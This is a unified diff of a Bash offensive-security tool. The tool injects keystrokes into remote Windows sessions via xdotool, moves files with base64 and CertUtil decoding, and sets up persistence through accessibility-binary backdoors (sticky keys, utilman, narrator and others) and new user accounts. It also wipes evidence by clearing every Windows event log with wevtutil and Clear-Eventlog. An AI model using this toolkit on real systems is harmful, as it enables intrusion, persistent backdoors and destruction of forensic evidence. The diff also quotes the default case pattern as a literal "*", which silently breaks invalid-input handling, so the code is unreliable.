@@ -10,13 +10,13 @@ function print_status {
     # Bold Yellow for warning
     # Bold Red for error
     # * default to white
-    case $status in
-        information) color="\033[34m[*]\033[0m" ;;
-        progress) color="\033[1;34m[*]\033[0m" ;;
-        completed) color="\033[1;32m[+]\033[0m" ;;
-        warning) color="\033[1;33m[!]\033[0m" ;;
-        error) color="\033[1;31m[-]\033[0m" ;;
-        *) color="\033[0m" ;;
+    case "$status" in
+        "information") color="\033[34m[*]\033[0m" ;;
+        "progress") color="\033[1;34m[*]\033[0m" ;;
+        "completed") color="\033[1;32m[+]\033[0m" ;;
+        "warning") color="\033[1;33m[!]\033[0m" ;;
+        "error") color="\033[1;31m[-]\033[0m" ;;
+        "*") color="\033[0m" ;;
     esac
 
     echo -e "$color $message"
@@ -89,19 +89,19 @@ function Execute {
     local commands=$1
     local method=$2
 
-    case $method in
-        none)
+    case "$method" in
+        "none")
             print_status "progress" "Executing commands..."
             xdotool_return_input "$commands" "escapechars"
             print_status "completed" "Task completed!"
             ;;
-        dialogbox)
+        "dialogbox")
             DialogBox "$commands"
             ;;
-        runspace)
+        "runspace")
             MSBuild "$commands"
             ;;
-        *)
+        "*")
             print_status "error" "Invalid Execution Type!" >&2
             exit 1
             ;;
@@ -112,7 +112,7 @@ function DialogBox {
     local commands=$1
 
     print_status "progress" "Checking one of the lines reaches 260 character limit"
-    length=$(echo -n "$commands" | wc -c)
+    length=${#commands}
     if [ "$length" -ge 260 ]
     then
         print_status "error" "Character Limit reached! Terminating program."
@@ -142,25 +142,25 @@ function OutputRemoteFile {
     # TODO: Implement bin2hex method
 
     case $method in
-        "" | pwshb64)
+        "" | "pwshb64")
             Base64 "$local_file" "$remote_file" "$platform" "powershell"
             ;;
-        cmdb64)
+        "cmdb64")
             CopyCon "$local_file" "$remote_file" "$platform" "base64"
             ;;
-        nixb64)
+        "nixb64")
             Base64 "$local_file" "$remote_file" "$platform" "console"
             ;;
-        outfile)
+        "outfile")
             PowershellOutFile "$local_file" "$remote_file" "$platform" "text"
             ;;
-        pwshcertutil)
+        "pwshcertutil")
             PowershellOutFile "$local_file" "$remote_file" "$platform" "certutil"
             ;;
-        copycon)
+        "copycon")
             CopyCon "$local_file" "$remote_file" "$platform" "text"
             ;;
-        *)
+        "*")
             print_status "error" "Invalid File Transfer Technique!" >&2
             exit 1
             ;;
@@ -226,6 +226,7 @@ function Bin2Hex {
     echo "Not implemented"
     
     data=$(hexdump -v -e '"\" 1/1 "%02x"' "$input")
+    length=${#data}
     
     # one line HEX value without spaces , columns ,addresses (either echo or tee to logging by appending)
 
@@ -259,7 +260,7 @@ function PowershellOutFile {
                 print_status "progress" "Checking one of the lines reaches 3477 character limit"
                 while read -r line
                 do
-                    length=$(echo -n "$line" | wc -c)
+                    length=${#line}
                     if [ "$length" -ge 3477 ]
                     then
                         print_status "error" "Character Limit reached!"
@@ -297,12 +298,13 @@ function PowershellOutFile {
 
             xdotool_return_input "-----END CERTIFICATE-----" "escapechars"
             xdotool_return_input "'@ | Out-File ${random_temp}.txt" "escapechars"
-            xdotool_return_input "CertUtil.exe -decode ${random_temp}.txt $output_file" "return"
+            xdotool_return_input "CertUtil.exe -f -decode ${random_temp}.txt $output_file" "return"
 
             xdotool_return_input "Remove-Item -Force ${random_temp}.txt" "return"
         elif [ "$mode" = "hex" ]
         then
             data=$(hexdump -v -e '"\" 1/1 "%02x"' "$input")
+            length=${#data}
             # in columns with spaces , without the characters and the addresses
             # (can be used with copycon and outfile)
             # Add a counter after 6 hexadecimal values give two spaces and
@@ -339,7 +341,7 @@ function CopyCon {
         print_status "progress" "Checking one of the lines reaches 255 character limit"
         while read -r line
         do
-            length=$(echo -n "$line" | wc -c)
+            length=${#line}
             if [ "$length" -ge 255 ]
             then
                 print_status "error" "Character Limit reached!"
@@ -385,7 +387,7 @@ function CopyCon {
         done <<< "$string_base64"
 
         xdotool_return_input "-----END CERTIFICATE-----" "copycon"
-        xdotool_return_input "CertUtil.exe -decode ${random_temp}.txt $output_file" "return"
+        xdotool_return_input "CertUtil.exe -f -decode ${random_temp}.txt $output_file" "return"
         xdotool_return_input "del /f ${random_temp}.txt" "return"
     elif [ "$mode" = "hex" ]
     then
@@ -585,26 +587,26 @@ function Persistence {
     # for both command prompt and powershell. To enumerate, persistence and cleanup
     # For "backdoor" to activate the backdoor
     # TODO: Fill in the rest of the persistence methods
-    case $persistence_method in
-        createuser)
+    case "$persistence_method" in
+        "createuser")
             CreateUser "$persistence_mode" "$platform"
             ;;
-        sethc)
+        "sethc")
             StickyKey "$persistence_mode" "$platform"
             ;;
-        utilman)
+        "utilman")
             UtilityManager "$persistence_mode" "$platform"
             ;;
-        magnifier)
+        "magnifier")
             Magnifier "$persistence_mode" "$platform"
             ;;
-        narrator)
+        "narrator")
             Narrator "$persistence_mode" "$platform"
             ;;
-        displayswitch)
+        "displayswitch")
             DisplaySwitch "$persistence_mode" "$platform"
             ;;
-        *)
+        "*")
             print_status "error" "Invalid Persistence Technique!" >&2
             exit 1
             ;;
@@ -630,10 +632,10 @@ EOF
     if [ "$mode" = "info" ]
     then
         echo "$description"
-    elif [ "$mode" = "execute" ]
+    elif [ "$mode" = "quick" ]
     then
         Execute "for /f \"tokens=*\" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\"" "none"
-    elif [ "$mode" = "script" ]
+    elif [ "$mode" = "full" ]
     then
     # TODO: Include the wiper and then transfer it with Base64 certutil cmd terminal
         echo "not implemented"
@@ -653,10 +655,10 @@ EOF
     if [ "$mode" = "info" ]
     then
         echo "$description"
-    elif [ "$mode" = "execute" ]
+    elif [ "$mode" = "quick" ]
     then
         Execute "Clear-Eventlog -Log Application,Security,System -Confirm" "none"
-    elif [ "$mode" = "script" ]
+    elif [ "$mode" = "full" ]
     then
     # TODO: Include the wiper and then transfer it with Base64 powershell terminal
         echo "not implemented"
@@ -699,17 +701,17 @@ function AntiForensics {
     # Batch script
     # Powershell script
     # Bash script
-    case $antiforensics_method in
-        wevutil)
+    case "$antiforensics_method" in
+        "wevutil")
             WevUtil "$antiforensics_mode" "$platform" "$antiforensics_method"
             ;;
-        winevent)
+        "winevent")
             WinEvent "$antiforensics_mode" "$platform" "$antiforensics_method"
             ;;
-        eventvwr)
+        "eventvwr")
             EventViewer "$antiforensics_mode $platform" "$antiforensics_method"
             ;;
-        *)
+        "*")
             print_status "error" "Invalid Antiforensic Technique!" >&2
             exit 1
             ;;
